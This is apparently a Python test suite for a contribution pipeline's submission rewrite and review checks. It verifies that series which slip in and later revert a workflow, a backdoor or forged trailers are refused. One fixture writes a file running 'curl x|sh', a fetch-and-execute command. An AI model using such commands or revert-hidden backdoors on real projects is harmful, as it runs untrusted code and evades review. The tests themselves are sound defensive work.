# SPDX-FileCopyrightText: 2026 The RISE Project
# SPDX-License-Identifier: MIT
"""The trusted checks of the submission rewrite and review Results, the Work
they answer, and the table rows they decide."""

import copy
import hashlib
import tempfile
import time
import unittest
import unittest.mock
from pathlib import Path

import commit_rules
import fork_publish
import lifecycle as lc
import submission
import work
from tests.helpers import commit_files, git, init_repo
from tests.test_commit_rules import RULES
from tests.test_dossier_gate import dossier

SECTIONS = ["Summary", "Testing"]
APP_SIGNOFF = "Signed-off-by: " + commit_rules.APP_IDENTITY
BODY = "## Summary\n\nAdd riscv64.\n\n## Testing\n\n- [x] CI"


class TestCheck(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        root = self.root = Path(self.tmp.name)
        self.saved = (fork_publish.URL_TEMPLATE, list(fork_publish.TEST_EXTRA_CONFIG))
        fork_publish.URL_TEMPLATE = f"file://{root}/{{}}.git"
        fork_publish.TEST_EXTRA_CONFIG[:] = ["-c", "protocol.file.allow=always"]
        self.work = init_repo(root / "work")
        self.base = commit_files(self.work, {"setup.py": "a\n", "ci.yml": "jobs: []\n"}, msg="base")
        for name in ("riseproject-upstreaming/proj", "example/proj"):
            (root / name).parent.mkdir(parents=True, exist_ok=True)
            git(root, "init", "-q", "--bare", str(root / f"{name}.git"))
        git(self.work, "push", "-q", str(root / "example/proj.git"), "HEAD:refs/heads/main")
        commit_files(self.work, {"setup.py": "b\n"}, msg="Build riscv64")
        commit_files(self.work, {"ci.yml": "jobs: [debug]\n"}, msg="{debug} lift the fork guard")
        commit_files(self.work, {"setup.py": "c\n"}, msg="Test riscv64")
        self.approved = git(self.work, "rev-parse", "HEAD")
        git(self.work, "push", "-q", str(root / "riseproject-upstreaming/proj.git"),
            "HEAD:refs/heads/riscv64-dev")
        self.runs = 0

    def tearDown(self):
        fork_publish.URL_TEMPLATE, extra = self.saved
        fork_publish.TEST_EXTRA_CONFIG[:] = extra
        self.tmp.cleanup()

    def series(self, *messages, change=None, debug=False, squash=False):
        """A reviewed series on the base: the non-debug commits with new
        messages, optionally with a code change or a debug commit."""
        self.runs += 1
        repo = self.root / f"review-{self.runs}"
        git(self.root, "clone", "-q", str(self.root / "riseproject-upstreaming/proj.git"), str(repo))
        git(repo, "checkout", "-q", "-B", "review", self.base)
        picks = [s for s in git(repo, "rev-list", "--reverse", f"{self.base}..origin/riscv64-dev").split()
                 if not git(repo, "log", "-1", "--format=%s", s).startswith("{debug}")]
        if debug:
            picks = git(repo, "rev-list", "--reverse", f"{self.base}..origin/riscv64-dev").split()
        for sha, message in zip(picks, messages):
            git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "cherry-pick", sha)
            git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--amend",
                "-m", message)
        if squash:
            git(repo, "reset", "-q", "--soft", self.base)
            git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", messages[0])
        if change:
            commit_files(repo, change, msg=messages[-1] + " too")
        return git(repo, "format-patch", "--stdout", self.base).encode() + b"\n"

    def task(self, **context):
        return {"task": "submission_rewrite", "contribution_id": "example--proj/12", "revision": 4,
                "expected_head": self.approved, "base_sha": self.base,
                "fork": "riseproject-upstreaming/proj", "upstream": "example/proj",
                "allowed_paths": ["setup.py", "ci.yml"], "context": context}

    def review(self, mbox, **over):
        value = {"schema_version": 1, "contribution_id": "example--proj/12",
                 "expected_revision": 4, "expected_head": self.approved, "verdict": "pass",
                 "reasons": [], "title": "Build riscv64 wheels", "body": BODY,
                 "series_digest": hashlib.sha256(mbox).hexdigest()}
        value.update(over)
        return value

    def check(self, mbox, task=None, **over):
        self.checks = getattr(self, "checks", 0) + 1
        return submission.check_rewrite(task or self.task(), self.review(mbox, **over), mbox,
                                        workdir=self.root / f"check-{self.checks}")

    def test_a_passing_review(self):
        mbox = self.series("ci: Build riscv64 wheels\n\nBody.\n\n" + APP_SIGNOFF,
                           "ci: Test riscv64 wheels\n\nBody.\n\n" + APP_SIGNOFF)
        out = self.check(mbox, self.task(commit_rules=dict(RULES, max_commits=None),
                                         template_sections=SECTIONS))
        self.assertEqual((out["verdict"], out["reasons"]), ("pass", []))
        self.assertEqual(out["clean_tree"], out["commits"][-1]["tree"])
        self.assertNotEqual(out["clean_tree"], out["candidate_tree"])
        self.assertEqual([c["message"].split("\n")[0] for c in out["commits"]],
                         ["ci: Build riscv64 wheels", "ci: Test riscv64 wheels"])
        # The head is deterministic: the same series gives the same head.
        again = self.check(mbox, self.task(commit_rules=dict(RULES, max_commits=None),
                                           template_sections=SECTIONS))
        self.assertEqual(again["head"], out["head"])

    def intermediate(self, *steps):
        """A reviewed series: the non-debug commits cherry-picked on the
        base, then ``steps`` of (files, removed, message)."""
        self.runs += 1
        repo = self.root / f"evil-{self.runs}"
        git(self.root, "clone", "-q", str(self.root / "riseproject-upstreaming/proj.git"), str(repo))
        git(repo, "checkout", "-q", "-B", "review", self.base)
        picks = [s for s in git(repo, "rev-list", "--reverse", f"{self.base}..origin/riscv64-dev").split()
                 if not git(repo, "log", "-1", "--format=%s", s).startswith("{debug}")]
        for sha in picks:
            git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "cherry-pick", sha)
        for files, removed, message in steps:
            if removed:
                git(repo, "rm", "-q", *removed)
            commit_files(repo, files, msg=message)
        return git(repo, "format-patch", "--stdout", self.base).encode() + b"\n"

    def test_an_intermediate_commit_is_validated_like_the_head(self):
        """The reproduced exploit: an out-of-scope workflow with
        `pull_request_target`, an executable payload, and a backdoor in a
        scope file are added and reverted again, so the head has the
        approved tree."""
        mbox = self.intermediate(
            ({".github/workflows/x.yml": "on: pull_request_target\njobs: {}\n",
              "evil.py": "import os; os.system('curl x|sh')\n", "setup.py": "c\nBACKDOOR\n"},
             (), "Tidy"),
            ({"setup.py": "c\n"}, (".github/workflows/x.yml", "evil.py"), "Tidy more"))
        out = self.check(mbox)
        reasons = "\n".join(out["reasons"])
        self.assertEqual(out["verdict"], "fail")
        self.assertEqual(out["tree"] if "tree" in out else out["clean_tree"], out["clean_tree"])
        self.assertIn(".github/workflows/x.yml: outside the approved patch surface", reasons)
        self.assertIn("introduces", reasons)
        self.assertIn("touches .github/workflows/x.yml, evil.py", reasons)
        self.assertIn("content in setup.py that no commit of the approved series has", reasons)

    def test_a_backdoor_in_scope_reverted_later_is_refused(self):
        mbox = self.intermediate(({"setup.py": "c\nBACKDOOR\n"}, (), "Tidy"),
                                 ({"setup.py": "c\n"}, (), "Tidy more"))
        out = self.check(mbox)
        self.assertEqual(out["verdict"], "fail")
        self.assertTrue(any("content in setup.py" in r for r in out["reasons"]), out["reasons"])

    def test_a_symlink_or_a_new_mode_in_an_intermediate_commit_is_refused(self):
        self.runs += 1
        repo = self.root / f"mode-{self.runs}"
        git(self.root, "clone", "-q", str(self.root / "riseproject-upstreaming/proj.git"), str(repo))
        git(repo, "checkout", "-q", "-B", "review", self.base)
        picks = [s for s in git(repo, "rev-list", "--reverse", f"{self.base}..origin/riscv64-dev").split()
                 if not git(repo, "log", "-1", "--format=%s", s).startswith("{debug}")]
        for sha in picks:
            git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "cherry-pick", sha)
        (repo / "setup.py").chmod(0o755)
        git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-am", "Mode")
        (repo / "setup.py").chmod(0o644)
        git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-am", "Mode back")
        mbox = git(repo, "format-patch", "--stdout", self.base).encode() + b"\n"
        out = self.check(mbox)
        self.assertEqual(out["verdict"], "fail")
        self.assertTrue(any("executable file mode" in r for r in out["reasons"]), out["reasons"])

    def test_attribution_trailers_are_the_app_or_those_of_the_approved_commits(self):
        for trailer in ("Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
                        "Co-authored-by: Real Maintainer <m@example.org>", "Reviewed-by: x <x@y.z>",
                        "Acked-by: x", "Tested-by: x", "Reported-by: x", "Suggested-by: x",
                        "Helped-by: x"):
            with self.subTest(trailer=trailer):
                mbox = self.series("Build riscv64 wheels\n\n" + trailer,
                                   "Test riscv64 wheels\n\n" + APP_SIGNOFF)
                out = self.check(mbox)
                self.assertEqual(out["verdict"], "fail")
                self.assertTrue(any("attribution trailer" in r for r in out["reasons"]),
                                out["reasons"])

    def test_a_failed_review_keeps_its_reasons(self):
        out = self.check(b"", verdict="fail", reasons=["A CHANGELOG entry is missing"],
                         series_digest=None)
        self.assertEqual((out["verdict"], out["reasons"]),
                         ("fail", ["rewrite: A CHANGELOG entry is missing"]))

    def test_a_code_change_is_refused(self):
        mbox = self.series("Build riscv64 wheels", "Test riscv64 wheels",
                           change={"setup.py": "d\n"})
        out = self.check(mbox)
        self.assertEqual(out["verdict"], "fail")
        self.assertTrue(any("changes the tree" in r for r in out["reasons"]), out["reasons"])

    def test_a_squash_with_the_same_tree_passes_but_max_commits_counts(self):
        mbox = self.series("Build and test riscv64 wheels", "x", squash=True)
        self.assertEqual(self.check(mbox)["verdict"], "pass")
        mbox = self.series("Build riscv64 wheels", "Test riscv64 wheels")
        out = self.check(mbox, self.task(commit_rules=dict(
            RULES, max_commits=1, title_prefix_required=False, body_required=False,
            signed_off_by_required=False)))
        self.assertIn("check: the series has 2 commits, more than 1", out["reasons"])

    def other_series(self, approved, reviewed):
        """An approved series of ``approved`` steps on the base, pushed to
        the fork, and a reviewed series of ``reviewed`` steps on the base;
        returns the rewrite Work of that approved head and the reviewed
        mbox."""
        self.runs += 1
        git(self.work, "checkout", "-q", "-B", f"alt-{self.runs}", self.base)
        for files, message in approved:
            commit_files(self.work, files, msg=message)
        head = git(self.work, "rev-parse", "HEAD")
        git(self.work, "push", "-q", str(self.root / "riseproject-upstreaming/proj.git"),
            f"HEAD:refs/heads/alt-{self.runs}")
        repo = self.root / f"other-{self.runs}"
        git(self.root, "clone", "-q", str(self.root / "riseproject-upstreaming/proj.git"), str(repo))
        git(repo, "checkout", "-q", "-B", "review", self.base)
        for files, message in reviewed:
            commit_files(repo, files, msg=message)
        task = dict(self.task(), expected_head=head, allowed_paths=["setup.py", "ci.yml", "tool.py"])
        return task, git(repo, "format-patch", "--stdout", self.base).encode() + b"\n"

    def other_check(self, task, mbox):
        self.checks = getattr(self, "checks", 0) + 1
        return submission.check_rewrite(task, self.review(mbox, expected_head=task["expected_head"]),
                                        mbox, workdir=self.root / f"check-{self.checks}")

    def test_every_reviewed_tree_is_a_tree_of_the_approved_series_in_order(self):
        approved = [({"setup.py": "b\n", "tool.py": "BACKDOOR\n"}, "Build"),
                    ({"tool.py": "fine\n"}, "Fix the tool"),
                    ({"setup.py": "c\n"}, "Test")]
        cases = {
            # Squashed and reworded: trees of the series, in its order.
            "squash": ([({"setup.py": "c\n", "tool.py": "fine\n"}, "Build and test")], []),
            "reword": ([({"setup.py": "b\n", "tool.py": "BACKDOOR\n"}, "ci: Build"),
                        ({"tool.py": "fine\n"}, "ci: Fix the tool"),
                        ({"setup.py": "c\n"}, "ci: Test")], []),
            "squash the fix": ([({"setup.py": "b\n", "tool.py": "fine\n"}, "Build"),
                                ({"setup.py": "c\n"}, "Test")], []),
            # Reordered: the test before the fix of the tool.
            "reorder": ([({"setup.py": "b\n", "tool.py": "BACKDOOR\n"}, "Build"),
                         ({"setup.py": "c\n"}, "Test"),
                         ({"tool.py": "fine\n"}, "Fix the tool")], ["is not a tree of"]),
            # The backdoor the series reverted, brought back between trees of
            # the series: every blob is one the approved series has.
            "resurrection": ([({"setup.py": "b\n", "tool.py": "fine\n"}, "Build"),
                              ({"setup.py": "c\n", "tool.py": "BACKDOOR\n"}, "Test"),
                              ({"tool.py": "fine\n"}, "Tidy")], ["is not a tree of"]),
            # Back to an earlier tree of the series and forward again.
            "back and forth": ([({"setup.py": "c\n", "tool.py": "fine\n"}, "All"),
                                ({"setup.py": "b\n", "tool.py": "BACKDOOR\n"}, "Again"),
                                ({"setup.py": "c\n", "tool.py": "fine\n"}, "All again")],
                               ["comes earlier in"]),
            # A split into a tree the series never has.
            "split": ([({"setup.py": "b\n"}, "Build"),
                       ({"tool.py": "BACKDOOR\n"}, "Add the tool"),
                       ({"tool.py": "fine\n"}, "Fix the tool"),
                       ({"setup.py": "c\n"}, "Test")], ["is not a tree of"]),
        }
        for name, (reviewed, problems) in cases.items():
            with self.subTest(name):
                out = self.other_check(*self.other_series(approved, reviewed))
                reasons = "\n".join(out["reasons"])
                self.assertEqual(out["verdict"], "fail" if problems else "pass", reasons)
                for problem in problems:
                    self.assertIn(problem, reasons)
        # Only the tree check refuses the resurrection: every file of every
        # reviewed tree has a path, mode, and blob of the approved series.
        out = self.other_check(*self.other_series(approved, cases["resurrection"][0]))
        self.assertFalse(any("content in" in r for r in out["reasons"]), out["reasons"])

    def test_a_long_series_is_refused_before_any_commit_is_validated(self):
        steps = [({"setup.py": "b\n" if i % 2 == 0 else "c\n"}, (), f"Step {i}")
                 for i in range(submission.MAX_COMMITS + 9)]
        mbox = self.intermediate(*steps)
        never = unittest.mock.Mock(side_effect=AssertionError("validated a commit"))
        with unittest.mock.patch("publisher.validate_update", never), \
                unittest.mock.patch("submission.intermediate_problems", never), \
                unittest.mock.patch("handoff.rebuild_without_debug", never):
            # The mbox is counted before anything is rebuilt.
            with unittest.mock.patch("fork_publish.rebuild", never):
                started = time.monotonic()
                out = self.check(mbox)
                self.assertLess(time.monotonic() - started, 2)
            self.assertEqual(out["verdict"], "fail")
            self.assertIn("more than 50 commits", "\n".join(out["reasons"]))
            # The rebuilt series is counted before any commit is validated,
            # whatever the mbox count.
            with unittest.mock.patch("commit_rules.mbox_starts", return_value=[]):
                out = self.check(mbox)
            self.assertEqual(out["verdict"], "fail")
            self.assertIn(f"has {submission.MAX_COMMITS + 11} commits, more than 50",
                          "\n".join(out["reasons"]))
        never.assert_not_called()

    def test_measurable_rules_and_template_sections(self):
        mbox = self.series("build riscv64 wheels.", "Test riscv64 wheels")
        out = self.check(mbox, self.task(commit_rules=dict(RULES, max_commits=None),
                                         template_sections=SECTIONS), body="## Summary\n\nx")
        reasons = "\n".join(out["reasons"])
        for problem in ("none of the prefixes", "capital letter", "ends with a period",
                        "no body", "no Signed-off-by", "no section 'Testing'"):
            self.assertIn(problem, reasons)
        self.assertEqual(out["verdict"], "fail")

    def test_a_debug_commit_in_the_reviewed_series_is_refused(self):
        mbox = self.series("Build riscv64", "{debug} lift the fork guard", "Test riscv64",
                           debug=True)
        out = self.check(mbox)
        self.assertEqual(out["verdict"], "fail")
        self.assertTrue(any("{debug}" in r for r in out["reasons"]), out["reasons"])

    def test_an_unusable_rewrite_is_not_a_verdict(self):
        """A rewrite that does not answer the Work, has no series, or is
        malformed is Work without a usable Result (a Work retry), never a
        failed submission."""
        mbox = self.series("Build riscv64 wheels", "Test riscv64 wheels")
        for over, problem in (({"expected_head": "e" * 40}, "expected_head"),
                              ({"expected_revision": 3}, "expected_revision"),
                              ({"series_digest": "0" * 64}, "digest"),
                              ({"title": "two\nlines"}, "one line"),
                              ({"body": "x\n" * 7000}, "more than 12000"),
                              ({"unknown": 1}, "malformed")):
            with self.subTest(problem=problem):
                out = self.check(mbox, **over)
                self.assertEqual((out["status"], out["failure_class"]), ("rejected", "validation"))
                self.assertIn(problem, out["reason"])
        out = submission.check_rewrite(dict(self.task(), task="development_patch"),
                                       self.review(mbox), mbox)
        self.assertEqual(out["status"], "rejected")
        out = submission.check_rewrite(self.task(), self.review(mbox), None)
        self.assertEqual(out["status"], "rejected")

    def test_a_series_that_does_not_apply_is_refused(self):
        out = self.check(b"From " + b"0" * 40 + b" Mon Sep 17 00:00:00 2001\nnot a patch\n")
        self.assertEqual(out["verdict"], "fail")

    def test_a_legacy_dossier_applies_the_rules_the_review_found(self):
        mbox = self.series("Build riscv64 wheels", "Test riscv64 wheels")
        out = self.check(mbox, commit_rules=dict(RULES, max_commits=None),
                         template_sections=["Checklist"])
        self.assertEqual(out["verdict"], "fail")
        self.assertTrue(any("none of the prefixes" in r for r in out["reasons"]))
        self.assertTrue(any("'Checklist'" in r for r in out["reasons"]))
        # The dossier's rules, when it records them, are the ones applied.
        out = self.check(mbox, self.task(commit_rules=commit_rules.normalize({}),
                                         template_sections=[]),
                         commit_rules=dict(RULES, max_commits=None), template_sections=["x"])
        self.assertEqual(out["verdict"], "pass")


class TestReviewCheck(unittest.TestCase):
    """The review of exactly the rewritten series and text."""

    REWRITE = {"evidence_id": "submission-rewrite-x-r5-7001", "head": "c" * 40,
               "series_digest": "5" * 64, "text_digest": submission.text_digest("T", "B"),
               "run_id": "7001", "artifact_id": 77}

    def task(self, **over):
        value = {"task": "submission_review", "contribution_id": "example--proj/12", "revision": 5,
                 "expected_head": "a" * 40, "base_sha": "b" * 40,
                 "context": {"rewrite": dict(self.REWRITE)}}
        value.update(over)
        return value

    def review(self, **over):
        value = {"schema_version": 1, "contribution_id": "example--proj/12", "expected_revision": 5,
                 "expected_head": "a" * 40, "verdict": "pass", "reasons": [],
                 "series_digest": "5" * 64, "text_digest": self.REWRITE["text_digest"],
                 "expectations": [{"expectation": "The template's Testing section is filled",
                                   "source": "pull_request_template", "met": True}]}
        value.update(over)
        return value

    def test_a_pass_and_a_fail(self):
        out = submission.check_review(self.task(), self.review())
        self.assertEqual((out["status"], out["verdict"], out["reasons"], out["rewrite_evidence_id"]),
                         ("submission_review", "pass", [], self.REWRITE["evidence_id"]))
        out = submission.check_review(self.task(), self.review(
            verdict="fail", reasons=["The CHANGELOG entry the contributing guide asks for is missing"]))
        self.assertEqual((out["verdict"], out["reasons"]), (
            "fail", ["review: The CHANGELOG entry the contributing guide asks for is missing"]))
        # A pass that lists an unmet expectation blocks.
        out = submission.check_review(self.task(), self.review(expectations=[
            {"expectation": "Commits are signed off", "met": False}]))
        self.assertEqual((out["verdict"], out["reasons"]),
                         ("fail", ["review: expectation not met: Commits are signed off"]))

    def test_an_unusable_review_is_not_a_verdict(self):
        for task, review in (
                (self.task(), self.review(series_digest="6" * 64)),
                (self.task(), self.review(text_digest="6" * 64)),
                (self.task(), self.review(expected_revision=4)),
                (self.task(), self.review(expectations=[])),
                (self.task(), self.review(title="a review may not write text")),
                (self.task(), {"verdict": "pass"}),
                (self.task(context={}), self.review()),
                (self.task(task="submission_rewrite"), self.review())):
            with self.subTest(review=review, task=task.get("task")):
                out = submission.check_review(task, review)
                self.assertEqual((out["status"], out["failure_class"]), ("rejected", "validation"))


class TestReviewWork(unittest.TestCase):
    def test_the_submission_tasks_are_uncredentialed_and_write_nothing(self):
        for task in (work.SUBMISSION_REWRITE, work.SUBMISSION_REVIEW):
            self.assertNotIn(task, work.WRITE_TASKS)
            self.assertEqual(work.ALLOWED_OPERATIONS[task], [])
            self.assertEqual(work.profile_for(task), work.WORKER_PROFILE)
            contract = work.effect_contract(task)
            self.assertEqual([o["type"] for o in contract["outputs"] if o.get("min")],
                             ["upload_artifact"])

    def test_the_review_carries_the_rules_and_the_sections(self):
        data = dossier()
        self.assertEqual(commit_rules.sections_from_dossier(data), SECTIONS)
        self.assertEqual(commit_rules.from_dossier(data)["title_max_length"], 72)

    def test_the_table_rows_of_the_rewrite_and_the_review(self):
        accept = lc.find_edge("handoff.agent_running", "accept_submission_rewrite")
        reject = lc.find_edge("handoff.agent_running", "reject_submission_rewrite")
        self.assertEqual((accept.target, reject.target),
                         ("handoff.review_pending", "development.fix_needed"))
        self.assertEqual(accept.transition.effects.revision, "bump")
        accept = lc.find_edge("handoff.reviewing", "accept_submission_review")
        reject = lc.find_edge("handoff.reviewing", "reject_submission_review")
        self.assertEqual((accept.target, reject.target),
                         ("handoff.building_upstream_branch", "development.fix_needed"))
        self.assertIn("pending_feedback_evidence_ids", reject.transition.effects.sets)
        self.assertEqual(reject.transition.effects.revision, "bump")
        self.assertEqual(accept.transition.effects.revision, "keep")
        for state in ("handoff.agent_running", "handoff.reviewing"):
            self.assertEqual(lc.find_edge(state, "allocate_work_retry").target, state)
            self.assertEqual(lc.find_edge(state, "exhaust_work_recovery").target,
                             "handoff.waiting_human")
        # An expired rewrite leads back to a fresh rewrite.
        for state in ("handoff.review_pending", "handoff.building_upstream_branch"):
            self.assertEqual(lc.find_edge(state, "expire_submission_rewrite").target,
                             "handoff.review_due")
        # No row of the review posts or builds anything; only the build of
        # `riscv64` writes the fork in handoff.
        self.assertEqual([k for k, s in lc.LIFECYCLE.items()
                          if lc.state_phase(k) == "handoff" and s.writes],
                         ["handoff.building_upstream_branch"])

    def test_the_check_finds_a_review_that_skips_the_build(self):
        from unittest import mock
        broken = copy.deepcopy(lc.LIFECYCLE["handoff.reviewing"])
        transitions = dict(broken.transitions)
        accept = transitions.pop(("accept_submission_review", "handoff.building_upstream_branch"))
        transitions[("accept_submission_review", "handoff.waiting_ci")] = accept
        reject = transitions.pop(("reject_submission_review", "development.fix_needed"))
        transitions[("reject_submission_review", "development.fix_needed")] = lc.Transition(
            reject.trigger, None, reject.guard,
            lc.Effects(revision="bump", work="clear", clears=reject.effects.clears))
        broken = lc.State(broken.kind, broken.launches, broken.writes, broken.description,
                          transitions)
        with mock.patch.dict(lc.LIFECYCLE, {"handoff.reviewing": broken}):
            problems = lc.check_table()
        self.assertTrue(any("reachable from handoff.awaiting_submission without "
                            "handoff.building_upstream_branch" in p for p in problems), problems)
        self.assertTrue(any("returns to development.fix_needed with its reasons" in p
                            for p in problems), problems)
        writer = copy.deepcopy(lc.LIFECYCLE["handoff.waiting_ci"])
        writer = lc.State(writer.kind, writer.launches, True, writer.description,
                          dict(writer.transitions))
        with mock.patch.dict(lc.LIFECYCLE, {"handoff.waiting_ci": writer}):
            self.assertTrue(any("not only handoff.building_upstream_branch" in p
                                for p in lc.check_table()))


if __name__ == "__main__":
    unittest.main()
